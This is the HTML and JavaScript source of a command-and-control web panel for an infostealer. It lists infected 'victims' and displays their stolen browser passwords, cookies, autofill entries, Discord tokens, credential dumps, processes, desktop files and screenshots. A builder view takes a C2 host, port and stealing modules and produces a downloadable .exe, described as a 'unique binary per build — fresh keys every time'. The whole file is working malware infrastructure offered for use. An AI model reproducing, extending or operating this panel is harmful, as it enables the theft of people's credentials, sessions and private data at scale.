<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>C2 Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0c10;--surface:#111520;--card:#161b2e;--border:#1e2640;
  --accent:#4f8ef7;--accent2:#7c5af7;--danger:#f74f4f;--ok:#4ff78a;
  --text:#e8eaf6;--muted:#5a6080;--font:'Segoe UI',system-ui,sans-serif;
}
body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh}
header{
  background:linear-gradient(135deg,#0d1220 0%,#13192e 100%);
  border-bottom:1px solid var(--border);
  padding:18px 32px;display:flex;align-items:center;gap:16px;
}
header h1{font-size:1.3rem;letter-spacing:.08em;font-weight:700;
  background:linear-gradient(90deg,var(--accent),var(--accent2));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}
.badge{background:var(--accent);color:#fff;font-size:.72rem;padding:2px 8px;
  border-radius:10px;font-weight:700;letter-spacing:.05em}
.status-dot{width:8px;height:8px;border-radius:50%;background:var(--ok);
  box-shadow:0 0 6px var(--ok);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.viewnav{display:flex;gap:2px;margin-left:8px}
.viewnav button{background:transparent;border:1px solid var(--border);color:var(--muted);
  padding:5px 16px;border-radius:6px;cursor:pointer;font-size:.8rem;font-weight:600;transition:.12s}
.viewnav button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
#view-builder{display:none;padding:24px;max-width:840px}
#view-builder.on{display:block}
#view-victims.off{display:none}
.b-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:18px}
.b-field label{display:block;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;
  color:var(--muted);margin-bottom:6px}
.b-field input{width:100%;background:var(--surface);border:1px solid var(--border);
  color:var(--text);padding:9px 12px;border-radius:6px;font-size:.92rem;font-family:var(--font)}
.b-field input:focus{outline:none;border-color:var(--accent)}
.b-mods{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px}
.b-mods label{background:var(--card);border:1px solid var(--border);border-radius:6px;
  padding:7px 13px;font-size:.8rem;cursor:pointer;display:flex;align-items:center;gap:7px;transition:.12s}
.b-mods label:has(input:checked){border-color:var(--accent);background:#1a2040}
.b-mods input{accent-color:var(--accent)}
.b-actions{display:flex;gap:10px;align-items:center;margin-bottom:16px;flex-wrap:wrap}
.btn{background:var(--accent);border:none;color:#fff;padding:10px 26px;border-radius:6px;
  font-size:.9rem;font-weight:600;cursor:pointer;transition:.12s}
.btn:hover{filter:brightness(1.1)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-dl{background:var(--ok);color:#062010;display:none;text-decoration:none;
  padding:10px 26px;border-radius:6px;font-size:.9rem;font-weight:600}
.btn-dl.on{display:inline-block}
.b-note{font-size:.75rem;color:var(--muted)}
#buildLog{background:#0e1218;border:1px solid var(--border);border-radius:8px;padding:14px;
  font-family:Consolas,monospace;font-size:.76rem;line-height:1.65;white-space:pre-wrap;
  max-height:340px;overflow-y:auto;color:#9fd0ff;min-height:120px}
.layout{display:grid;grid-template-columns:320px 1fr;height:calc(100vh - 61px)}
.sidebar{border-right:1px solid var(--border);overflow-y:auto;padding:16px}
.sidebar h2{font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;
  color:var(--muted);margin-bottom:12px}
.victim-card{
  background:var(--card);border:1px solid var(--border);border-radius:8px;
  padding:12px 14px;margin-bottom:8px;cursor:pointer;transition:.15s;
}
.victim-card:hover,.victim-card.active{border-color:var(--accent);background:#1a2040}
.victim-card .vc-host{font-weight:600;font-size:.9rem}
.victim-card .vc-meta{font-size:.73rem;color:var(--muted);margin-top:3px}
.victim-card .vc-tags{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
.tag{font-size:.68rem;padding:2px 7px;border-radius:4px;font-weight:600}
.tag-ulp{background:#1a3a20;color:var(--ok)}
.tag-discord{background:#1a1a40;color:#7289da}
.tag-cookie{background:#2a1a10;color:#f7a04f}
.main{overflow-y:auto;padding:24px}
.tabs{display:flex;gap:4px;margin-bottom:20px;flex-wrap:wrap}
.tab{padding:6px 16px;border-radius:6px;border:1px solid var(--border);
  background:var(--card);cursor:pointer;font-size:.82rem;transition:.12s}
.tab.active,.tab:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
.section{display:none}.section.active{display:block}
.info-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-bottom:20px}
.info-box{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:14px}
.info-box label{font-size:.7rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
.info-box span{display:block;margin-top:4px;font-weight:600;word-break:break-all}
pre.ulp{background:#0e1218;border:1px solid var(--border);border-radius:8px;
  padding:14px;font-size:.78rem;line-height:1.7;white-space:pre-wrap;
  word-break:break-all;max-height:500px;overflow-y:auto;color:#a8ffb0}
table{width:100%;border-collapse:collapse;font-size:.8rem}
th{text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);
  color:var(--muted);font-weight:600;font-size:.72rem;text-transform:uppercase;letter-spacing:.06em}
td{padding:7px 10px;border-bottom:1px solid #1a1e2e;word-break:break-all}
tr:hover td{background:#13192e}
.screenshot img{max-width:100%;border-radius:8px;border:1px solid var(--border)}
.empty{color:var(--muted);font-size:.85rem;padding:20px 0}
.copy-btn{background:var(--surface);border:1px solid var(--border);color:var(--accent);
  padding:4px 10px;border-radius:4px;cursor:pointer;font-size:.72rem;margin-left:8px}
.copy-btn:hover{background:var(--accent);color:#fff}
.ftree{font-family:Consolas,monospace;font-size:.82rem;line-height:1.9}
.ftree .fdir{color:var(--accent);font-weight:600}
.ftree .fchildren{margin-left:18px;border-left:1px solid var(--border);padding-left:10px}
.ftree .ffile{color:var(--text)}
.ftree .fsize{color:var(--muted);margin-left:10px;font-size:.72rem}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
</style>
</head>
<body>

<header>
  <div class="status-dot" id="dot"></div>
  <h1>C2 PANEL</h1>
  <span class="badge" id="count">0 victims</span>
  <div class="viewnav">
    <button id="navVictims" class="active" onclick="showView('victims')">Victims</button>
    <button id="navBuilder" onclick="showView('builder')">Builder</button>
  </div>
</header>
<div class="layout" id="view-victims">
  <div class="sidebar">
    <h2>Victims</h2>
    <div id="victimList"></div>
  </div>
  <div class="main" id="main">
    <div style="color:var(--muted);margin-top:80px;text-align:center;font-size:.9rem">
      Select a victim from the sidebar
    </div>
  </div>
</div>

<div id="view-builder">
  <div class="b-grid">
    <div class="b-field">
      <label>C2 Host</label>
      <input id="bHost" value="127.0.0.1" spellcheck="false"
             placeholder="127.0.0.1">
    </div>
    <div class="b-field">
      <label>C2 Port</label>
      <input id="bPort" type="number" value="4444" min="1" max="65535">
    </div>
    <div class="b-field">
      <label>Path</label>
      <input id="bPath" value="/collect" spellcheck="false">
    </div>
  </div>

  <div class="b-mods" id="bMods">
    <label><input type="checkbox" value="browsers" checked> browsers</label>
    <label><input type="checkbox" value="discord" checked> discord</label>
    <label><input type="checkbox" value="sysinfo" checked> sysinfo</label>
    <label><input type="checkbox" value="procs" checked> procs</label>
    <label><input type="checkbox" value="desktop" checked> desktop</label>
    <label><input type="checkbox" value="screenshot" checked> screenshot</label>
  </div>

  <div class="b-actions">
    <button class="btn" id="bBuild" onclick="startBuild()">Build</button>
    <a class="btn-dl" id="bDl" href="#">Download .exe</a>
    <span class="b-note" id="bNote">default 127.0.0.1:4444 — same box as this panel</span>
  </div>

  <div id="buildLog">ready. set host/port, pick modules, hit Build.</div>
</div>

<script>
const victims = {};
let selectedId = null;
let buildBusy = false;

function showView(name) {
  const isB = name === 'builder';
  document.getElementById('view-builder').classList.toggle('on', isB);
  document.getElementById('view-victims').classList.toggle('off', isB);
  document.getElementById('navBuilder').classList.toggle('active', isB);
  document.getElementById('navVictims').classList.toggle('active', !isB);
}

function buildLog(line) {
  const el = document.getElementById('buildLog');
  el.textContent += '\n' + line;
  el.scrollTop = el.scrollHeight;
}

async function startBuild() {
  if (buildBusy) return;
  buildBusy = true;
  const btn = document.getElementById('bBuild');
  const dl  = document.getElementById('bDl');
  btn.disabled = true; btn.textContent = 'Building…';
  dl.classList.remove('on');

  const host = document.getElementById('bHost').value.trim();
  const port = parseInt(document.getElementById('bPort').value, 10);
  const cpath = document.getElementById('bPath').value.trim();
  const modules = [...document.querySelectorAll('#bMods input:checked')].map(c => c.value);

  const log = document.getElementById('buildLog');
  log.textContent = `build → ${host}:${port}${cpath}  modules=[${modules.join(',')}]`;

  try {
    const r = await fetch('/build', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ host, port, path: cpath, modules })
    });
    const j = await r.json();
    if (!j.ok) buildLog('!! ' + (j.err || 'build rejected'));
    else buildLog('done → ' + j.file);
  } catch (e) {
    buildLog('!! ' + e);
  } finally {
    buildBusy = false;
    btn.disabled = false; btn.textContent = 'Build';
  }
}

const es = new EventSource('/events');
es.onmessage = e => {
  const d = JSON.parse(e.data);
  if (d.type === 'connected') { document.getElementById('dot').style.background='#4ff78a'; return; }
  if (d.type === 'victim') {
    victims[d.id] = d;
    renderSidebar();
    return;
  }
  if (d.type === 'build-start') { showView('builder'); return; }
  if (d.type === 'build-log')  { buildLog(d.line); return; }
  if (d.type === 'build-done') {
    if (d.ok) {
      buildLog('[+] ready: ' + d.file);
      const dl = document.getElementById('bDl');
      dl.href = '/download/' + encodeURIComponent(d.file);
      dl.classList.add('on');
      document.getElementById('bNote').textContent = 'unique binary per build — fresh keys every time';
    } else {
      buildLog('!! ' + (d.err || 'build failed'));
    }
  }
};
es.onerror = () => { document.getElementById('dot').style.background='#f74f4f'; };

fetch('/victims').then(r=>r.json()).then(list => {
  list.forEach(v => victims[v.id] = v);
  renderSidebar();
});

function renderSidebar() {
  const ids = Object.keys(victims).sort((a,b) => victims[b].ts > victims[a].ts ? 1 : -1);
  document.getElementById('count').textContent = ids.length + ' victim' + (ids.length===1?'':'s');
  document.getElementById('victimList').innerHTML = ids.map(id => {
    const v = victims[id];
    const ts = new Date(v.ts).toLocaleString();
    return `<div class="victim-card${id===selectedId?' active':''}" onclick="selectVictim('${id}')">
      <div class="vc-host">${esc(v.hostname||v.ip||'?')}</div>
      <div class="vc-meta">${esc(v.folder||'')} · ${ts}</div>
      <div class="vc-tags">
        ${v.pass_count>0?`<span class="tag tag-ulp">Pass ${v.pass_count}</span>`:''}
        ${v.ulp_count>0?`<span class="tag tag-ulp">ULP ${v.ulp_count}</span>`:''}
        ${v.discord_count>0?`<span class="tag tag-discord">Discord ${v.discord_count}</span>`:''}
        ${(v.cookie_count||0)>0?`<span class="tag tag-cookie">Cookies ${v.cookie_count}</span>`:''}
      </div>
    </div>`;
  }).join('');
}

async function selectVictim(id) {
  selectedId = id;
  renderSidebar();
  const r = await fetch('/victim/' + id);
  const v = await r.json();
  victims[id] = v;
  renderDetail(v);
}

function renderDetail(v) {
  const si = v.sysinfo || {};
  const tabs = ['sysinfo','passwords','ulp','discord','cookies','autofill','files','processes','desktop','screenshot'];
  document.getElementById('main').innerHTML = `
    <div class="tabs">${tabs.map(t=>`<div class="tab${t==='sysinfo'?' active':''}" onclick="switchTab('${t}',this)">${t.toUpperCase()}</div>`).join('')}</div>

    <div id="tab-sysinfo" class="section active">
      <div class="info-grid">
        ${['hostname','username','os','cpu','ram_total_mb','ram_avail_mb','local_ip','screen_w','screen_h']
          .map(k=>`<div class="info-box"><label>${k}</label><span>${esc(String(si[k]||'—'))}</span></div>`).join('')}
        <div class="info-box"><label>IP (remote)</label><span>${esc(v.ip||'—')}</span></div>
        <div class="info-box"><label>Folder</label><span>${esc(v.folder||'—')}</span></div>
        <div class="info-box"><label>Timestamp</label><span>${esc(v.ts||'—')}</span></div>
      </div>
    </div>

    <div id="tab-passwords" class="section">
      ${renderPasswords(v.browsers||[])}
    </div>

    <div id="tab-ulp" class="section">
      <button class="copy-btn" onclick="copyText('ulp-pre')">Copy all</button>
      <pre class="ulp" id="ulp-pre">${esc(v.ulp||'(empty)')}</pre>
    </div>

    <div id="tab-discord" class="section">
      ${renderTable(['client','token'], (v.discord||[]))}
    </div>

    <div id="tab-cookies" class="section">
      ${renderCookies(v.browsers||[])}
    </div>

    <div id="tab-autofill" class="section">
      ${renderAutofill(v.browsers||[])}
    </div>

    <div id="tab-files" class="section">
      <div class="b-note" style="margin-bottom:8px">panel/victims/${esc(v.folder||'')}/</div>
      <div id="fileTree">loading…</div>
    </div>

    <div id="tab-processes" class="section">
      ${renderTable(['pid','name','parent_pid'], v.processes||[])}
    </div>

    <div id="tab-desktop" class="section">
      ${renderTable(['name','is_dir','size'], v.desktop_files||[])}
    </div>

    <div id="tab-screenshot" class="section screenshot">
      ${v.screenshot ? `<img src="data:image/png;base64,${v.screenshot}" alt="screenshot">` : '<div class="empty">No screenshot</div>'}
    </div>`;
}

function switchTab(name, el) {
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('tab-'+name).classList.add('active');
  if (name === 'files') loadFiles();
}

function renderPasswords(browsers) {
  const any = browsers.some(b => (b.logins||[]).length);
  if (!any) return '<div class="empty">No passwords</div>';
  return browsers.map(br => {
    const byProfile = {};
    (br.logins||[]).forEach(l => {
      const k = l.profile || 'Default';
      (byProfile[k]=byProfile[k]||[]).push(l);
    });
    if (!Object.keys(byProfile).length) return '';
    return `<details open><summary style="cursor:pointer;padding:8px 0;font-weight:600">${esc(br.browser||'?')} (${(br.logins||[]).length})</summary>
      ${Object.entries(byProfile).map(([prof,rows])=>`
        <details${Object.keys(byProfile).length===1?' open':''} style="margin-left:12px">
          <summary style="cursor:pointer;padding:4px 0;color:var(--muted)">${esc(prof)} (${rows.length})</summary>
          ${renderTable(['url','user','pass'], rows)}
        </details>`).join('')}
    </details>`;
  }).join('');
}

function renderAutofill(browsers) {
  const any = browsers.some(b => (b.autofill||[]).length);
  if (!any) return '<div class="empty">No autofill</div>';
  return browsers.map(br => {
    const byProfile = {};
    (br.autofill||[]).forEach(a => {
      const k = a.profile || 'Default';
      (byProfile[k]=byProfile[k]||[]).push(a);
    });
    if (!Object.keys(byProfile).length) return '';
    return `<details open><summary style="cursor:pointer;padding:8px 0;font-weight:600">${esc(br.browser||'?')}</summary>
      ${Object.entries(byProfile).map(([prof,rows])=>`
        <details${Object.keys(byProfile).length===1?' open':''} style="margin-left:12px">
          <summary style="cursor:pointer;padding:4px 0;color:var(--muted)">${esc(prof)} (${rows.length})</summary>
          ${renderTable(['field','value'], rows)}
        </details>`).join('')}
    </details>`;
  }).join('');
}

async function loadFiles() {
  const el = document.getElementById('fileTree');
  if (!el || !selectedId) return;
  const v = victims[selectedId];
  const folder = v && v.folder;
  if (!folder || folder === '?') { el.innerHTML = '<div class="empty">No folder yet</div>'; return; }
  try {
    const r = await fetch('/files/' + encodeURIComponent(folder));
    if (!r.ok) { el.innerHTML = '<div class="empty">Folder not found</div>'; return; }
    const tree = await r.json();
    el.innerHTML = `<div class="ftree">${renderTree(tree)}</div>`;
  } catch (e) { el.innerHTML = '<div class="empty">' + esc(String(e)) + '</div>'; }
}

function renderTree(items) {
  if (!items || !items.length) return '<div class="empty">Empty folder</div>';
  return items.map(it => {
    const size = it.dir ? '' : `<span class="fsize">${fmtSize(it.size||0)}</span>`;
    if (it.dir)
      return `<div class="fdir">📁 ${esc(it.name)}/</div>
              <div class="fchildren">${renderTree(it.children)}</div>`;
    return `<div class="ffile">📄 ${esc(it.name)}${size}</div>`;
  }).join('');
}

function fmtSize(n) {
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n/1024).toFixed(1) + ' KB';
  return (n/1048576).toFixed(1) + ' MB';
}

function renderTable(cols, rows) {
  if (!rows||!rows.length) return '<div class="empty">No data</div>';
  return `<table><thead><tr>${cols.map(c=>`<th>${c}</th>`).join('')}</tr></thead>
    <tbody>${rows.map(r=>`<tr>${cols.map(c=>`<td>${esc(String(r[c]??''))}</td>`).join('')}</tr>`).join('')}</tbody></table>`;
}

function renderCookies(browsers) {
  if (!browsers.length) return '<div class="empty">No cookies</div>';
  return browsers.map(br => {
    const byProfile = {};
    (br.cookies||[]).forEach(c => {
      const k = c.profile || 'Default';
      (byProfile[k]=byProfile[k]||[]).push(c);
    });
    return `<details open><summary style="cursor:pointer;padding:8px 0;font-weight:600">${esc(br.browser||'?')}</summary>
      ${Object.entries(byProfile).map(([prof,cks])=>`
        <details style="margin-left:12px"><summary style="cursor:pointer;padding:4px 0;color:var(--muted)">${esc(prof)} (${cks.length})</summary>
          ${renderTable(['host','name','value','path','expires','secure'], cks)}
        </details>`).join('')}
    </details>`;
  }).join('');
}

function copyText(id) {
  const el = document.getElementById(id);
  navigator.clipboard.writeText(el.textContent).then(()=>{});
}
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
</script>
</body></html>
